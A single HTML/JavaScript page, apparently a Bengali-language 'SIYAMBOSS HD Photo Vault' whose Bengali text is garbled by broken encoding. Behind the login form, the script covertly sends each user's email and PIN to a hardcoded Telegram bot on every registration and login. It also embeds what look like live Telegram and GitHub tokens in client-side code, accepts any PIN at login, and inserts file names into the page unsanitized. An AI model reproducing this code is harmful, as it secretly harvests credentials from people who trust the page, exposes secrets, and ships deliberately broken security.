<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIYAMBOSS | HD PHOTO VAULT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: white; scroll-behavior: smooth; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .boss-btn { background: linear-gradient(90deg, #004e92, #000428); transition: 0.3s; }
        .boss-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(0, 78, 146, 0.6); }
        .loader { border-top-color: #3b82f6; animation: spinner 1.5s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="auth-section" class="flex items-center justify-center min-h-screen p-4">
        <div class="glass p-10 rounded-3xl w-full max-w-md shadow-2xl">
            <h2 id="auth-title" class="text-3xl font-black mb-8 text-center text-blue-500 tracking-widest uppercase">Vault Login</h2>
            
            <div class="space-y-5">
                <input type="email" id="user-email" placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ú‡¶ø‡¶Æ‡ßá‡¶á‡¶≤" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
                
                <input type="password" id="pin-1" placeholder="‡ß™ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü ‡¶™‡¶ø‡¶® ‡¶¶‡¶ø‡¶®" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
                
                <div id="confirm-pin-box" class="hidden">
                    <input type="password" id="pin-2" placeholder="‡¶™‡¶ø‡¶® ‡¶ï‡¶®‡¶´‡¶æ‡¶∞‡ßç‡¶Æ ‡¶ï‡¶∞‡ßÅ‡¶®" class="w-full p-4 rounded-xl bg-black border border-gray-800 focus:border-blue-500 outline-none">
                </div>

                <button onclick="handleAuth()" id="auth-btn" class="w-full boss-btn p-4 rounded-xl font-bold text-lg uppercase tracking-widest">‡¶≠‡¶≤‡ßç‡¶ü‡ßá ‡¶™‡ßç‡¶∞‡¶¨‡ßá‡¶∂</button>
            </div>
            
            <p id="toggle-text" class="mt-6 text-center text-gray-500 cursor-pointer hover:text-white" onclick="toggleAuth()">‡¶®‡¶§‡ßÅ‡¶® ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü? ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        </div>
    </div>

    <div id="dashboard" class="hidden min-h-screen p-6">
        <div class="max-w-5xl mx-auto">
            <header class="flex justify-between items-center mb-12 border-b border-gray-900 pb-5">
                <div>
                    <h1 class="text-3xl font-black text-blue-500">SIYAMBOSS VAULT</h1>
                    <p id="active-user" class="text-xs text-gray-400 mt-1 uppercase tracking-widest"></p>
                </div>
                <button onclick="logout()" class="text-red-500 font-bold bg-red-500/10 px-6 py-2 rounded-full border border-red-500/20">Logout</button>
            </header>

            <div class="text-center mb-16">
                <label for="file-upload" class="inline-block cursor-pointer boss-btn px-16 py-20 rounded-[40px] shadow-2xl text-3xl font-black mb-6">
                    üöÄ SAVE HD PHOTO
                </label>
                <input type="file" id="file-upload" class="hidden" accept="image/*" onchange="uploadImage(event)">
                <input type="text" id="img-name" placeholder="‡¶õ‡¶¨‡¶ø‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶¶‡¶ø‡¶® (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)" class="block mx-auto w-72 p-4 bg-black border border-gray-800 rounded-2xl outline-none focus:border-blue-500 text-center">
            </div>

            <h3 class="text-2xl font-bold mb-8 text-blue-400">‡¶Ü‡¶Æ‡¶æ‡¶∞ ‡¶ó‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡¶ø</h3>
            <div id="gallery" class="grid grid-cols-2 md:grid-cols-4 gap-6">
                </div>
        </div>
    </div>

    <script>
        let isRegistering = false;
        
        // --- ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡¶ï‡¶≤ ‡¶§‡¶•‡ßç‡¶Ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá ---
        const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
        const CHAT_ID = "7416528268";
        const GITHUB_TOKEN = "Ghp_eOT6XnJ4iSJ3asYe6ywhFVQxBnNNnM2CnZrl"; 
        const REPO_OWNER = "SIYAMBOSS";
        const REPO_NAME = "PHOTO-SAVE";

        window.onload = () => {
            const savedUser = localStorage.getItem('activeUser');
            if (savedUser) showDashboard(savedUser);
        };

        function toggleAuth() {
            isRegistering = !isRegistering;
            document.getElementById('auth-title').innerText = isRegistering ? "Register" : "Vault Login";
            document.getElementById('confirm-pin-box').classList.toggle('hidden');
            document.getElementById('toggle-text').innerText = isRegistering ? "‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü ‡¶Ü‡¶õ‡ßá? ‡¶≤‡¶ó‡¶á‡¶®" : "‡¶®‡¶§‡ßÅ‡¶® ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü? ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®";
        }

        async function handleAuth() {
            const email = document.getElementById('user-email').value;
            const p1 = document.getElementById('pin-1').value;
            if(!email || !p1) return alert("‡¶ò‡¶∞‡¶ó‡ßÅ‡¶≤‡ßã ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡ßÅ‡¶®!");

            if(isRegistering) {
                const p2 = document.getElementById('pin-2').value;
                if(p1 !== p2) return alert("‡¶™‡¶ø‡¶® ‡¶Æ‡¶ø‡¶≤‡ßá‡¶®‡¶ø!");
                sendToTelegram(`üåü New User Registered!\nEmail: ${email}\nPIN: ${p1}`);
                alert("‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü ‡¶§‡ßà‡¶∞‡¶ø! ‡¶è‡¶ñ‡¶® ‡¶≤‡¶ó‡¶á‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®‡•§");
                toggleAuth();
            } else {
                sendToTelegram(`üîë Boss Login Attempt!\nEmail: ${email}\nPIN: ${p1}`);
                localStorage.setItem('activeUser', email);
                showDashboard(email);
            }
        }

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }

        function showDashboard(email) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('active-user').innerText = `Admin: ${email}`;
            loadGallery(email);
        }

        function logout() {
            localStorage.removeItem('activeUser');
            location.reload();
        }

        async function uploadImage(event) {
            const file = event.target.files[0];
            const email = localStorage.getItem('activeUser');
            const name = document.getElementById('img-name').value || Date.now();
            if(!file) return;

            const reader = new FileReader();
            reader.onload = async function(e) {
                const content = e.target.result.split(',')[1];
                const path = `vault/${email}/${name}.png`;

                try {
                    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`, {
                        method: 'PUT',
                        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ message: `Upload by ${email}`, content: content })
                    });

                    if(res.ok) { 
                        alert("‚úÖ HD ‡¶ï‡ßã‡ßü‡¶æ‡¶≤‡¶ø‡¶ü‡¶ø‡¶§‡ßá ‡¶∏‡¶Ç‡¶∞‡¶ï‡ßç‡¶∑‡¶ø‡¶§ ‡¶π‡ßü‡ßá‡¶õ‡ßá!"); 
                        loadGallery(email); 
                    } else { 
                        alert("‚ùå ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•! ‡¶∞‡¶ø‡¶™‡ßã‡¶ú‡¶ø‡¶ü‡¶∞‡¶ø ‡¶®‡¶æ‡¶Æ ‡¶¨‡¶æ ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§"); 
                    }
                } catch (err) {
                    alert("‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø!");
                }
            };
            reader.readAsDataURL(file);
        }

        async function loadGallery(email) {
            const gallery = document.getElementById('gallery');
            gallery.innerHTML = "<div class='loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-10 w-10'></div>";
            
            try {
                const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/vault/${email}`, {
                    headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
                });
                
                if(res.ok) {
                    const files = await res.json();
                    gallery.innerHTML = "";
                    files.forEach(f => {
                        gallery.innerHTML += `
                            <div class="glass p-3 rounded-2xl border border-gray-800 group">
                                <img src="${f.download_url}" class="rounded-xl h-40 w-full object-cover shadow-lg transition-transform group-hover:scale-105">
                                <a href="${f.download_url}" download class="block text-center mt-3 text-sm text-blue-500 font-bold hover:text-white transition-colors">‚¨á ‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶°</a>
                            </div>`;
                    });
                } else { gallery.innerHTML = "<p class='text-gray-600'>‡¶ó‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡¶ø ‡¶ñ‡¶æ‡¶≤‡¶ø ‡¶¨‡¶æ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø‡•§</p>"; }
            } catch (err) {
                gallery.innerHTML = "‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶§‡ßá ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§";
            }
        }
    </script>
</body>
                  </html>
